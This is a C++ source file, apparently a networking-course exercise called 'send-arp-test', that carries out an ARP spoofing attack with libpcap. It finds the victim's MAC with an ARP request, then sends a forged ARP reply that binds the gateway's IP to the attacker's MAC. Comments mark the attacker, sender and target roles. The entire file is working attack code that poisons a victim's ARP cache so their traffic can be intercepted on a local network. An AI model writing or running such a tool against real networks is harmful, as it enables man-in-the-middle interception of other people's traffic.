#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include "ethhdr.h"
#include "arphdr.h"
#define SIZE_ETHERNET 14

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

Mac get_sendmac(pcap_t* handle, Ip sip, char* memac, char* meip);
void ARP_request(pcap_t* handle, Ip sip, char* memac, char* meip);
void ARP_reply(pcap_t* handle, Ip sip, Ip tip, char* memac, Mac smac);

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    Ip sip = Ip(argv[2]);
    Ip tip = Ip(argv[3]);
    uint8_t* me_mac = (uint8_t*)malloc(sizeof(char)*6);
    char* meip = (char*)malloc(sizeof(char)*20);
    char* memac = (char*)malloc(sizeof(char)*20);

    struct ifreq ifrq;
    struct sockaddr_in *addr;
    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    strncpy(ifrq.ifr_name, argv[1], IFNAMSIZ);

    if (0 > ioctl(fd, SIOCGIFHWADDR, &ifrq)) {
        printf("Error get my mac address\n");
    }
    memcpy(me_mac, ifrq.ifr_hwaddr.sa_data, 6);

    if (0 > ioctl(fd, SIOCGIFADDR, &ifrq)) {
        printf("Error get my ip address\n");
    }
    addr = (struct sockaddr_in*)&ifrq.ifr_addr;
    meip = inet_ntoa(addr->sin_addr);

    sprintf(memac, "%02x:%02x:%02x:%02x:%02x:%02x",
           me_mac[0], me_mac[1], me_mac[2], me_mac[3],me_mac[4], me_mac[5]);

    Mac s_mac = get_sendmac(handle, sip, memac, meip);
    ARP_reply(handle, sip, tip, memac, s_mac);

    pcap_close(handle);
        return 0;
}



Mac get_sendmac(pcap_t* handle, Ip sip, char* memac, char* meip){
    ARP_request(handle, sip, memac, meip);
    while(1){
        const struct ArpHdr* arp_header;
        const struct EthHdr* eth_header;
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        eth_header = (struct EthHdr*)(packet);
        arp_header = (struct ArpHdr*)(packet+SIZE_ETHERNET);

        if((eth_header->type_==0x0608) && (ntohl(sip)==arp_header->sip_) &&
                (ntohl(Ip(meip))==arp_header->tip_)){
            return arp_header->smac_;
        }
    }
    return NULL;
}

void ARP_request(pcap_t* handle, Ip sip, char* memac, char* meip){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");   //broadcast
    packet.eth_.smac_ = Mac(memac);                      //me MAC(attacker)
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(memac);   //me MAC(attacker)
    packet.arp_.sip_ = htonl(Ip(meip));              //me ip(attacker)  /////
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");   //
    packet.arp_.tip_ = htonl(Ip(sip));              //you ip(sender)

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}


void ARP_reply(pcap_t* handle, Ip sip, Ip tip, char* memac, Mac smac){
    EthArpPacket packet;

    packet.eth_.dmac_ = smac;   //you MAC(sender)
    packet.eth_.smac_ = Mac(memac);   //me MAC(attacker)
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(memac);   //me MAC(attacker)
    packet.arp_.sip_ = htonl(Ip(tip));          //gateway ip(target)
    packet.arp_.tmac_ = smac;   //you MAC(sender)
    packet.arp_.tip_ = htonl(Ip(sip));          //you ip(sender)

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}